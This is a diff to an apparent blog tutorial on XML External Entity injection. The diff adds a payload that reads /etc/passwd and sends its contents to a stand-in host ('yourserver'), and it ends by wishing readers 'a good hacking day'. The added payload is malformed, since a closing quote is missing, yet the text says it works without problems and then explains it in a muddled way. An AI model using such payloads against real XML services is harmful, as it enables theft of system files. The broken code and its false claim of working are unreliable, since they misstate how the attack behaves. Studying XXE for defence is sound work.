@@ -113,15 +113,29 @@ Now, *Have anyone arise a question that why **we call the dtd from attacker's se
 
 this would be easier than before? Yes it is, but it is not going to work. 
 
-**According to [XML_DOC](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset)Actually parameter entity can't be called inside the DTD subset they can be called in the External subset (like we did in Payload no 2). It will be forbidden, hence you will get the forbidden error.**
+**According to [XML_DOC](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset), actually parameter entity can't be called inside the DTD subset they can be called in the External subset (like we did in Payload no 2). It will be forbidden, hence you will get the forbidden error.**
 
 So that's the reason why we can't run above payload.
 
-That's all guys, I just want to share because I want. :)
+Let's try another payload:-
+
+**Payload 4**:
+
+`<?xml version="1.0"?>`<br>
+`<!DOCTYPE root [`<br>
+`<!ENTITY filecontents SYSTEM 'file:///etc/passwd>`<br>
+`<!ENTITY test SYSTEM 'http://yourserver/&filecontents;'>]>`<br>
+`<root>&test;</root>`<br>
+
+So this payload works without any problem but your entity (oops, will correct it later) will act as string, because entity should be in root tag, if it is not it will act as String.
+
+That's all guys, I just want to share because I want. :). Any thing you want to edit please tell me in the comment section.
 
 Hope you like this read. 
 
 Have a good hacking day.
+
+Thanks
 
 
 
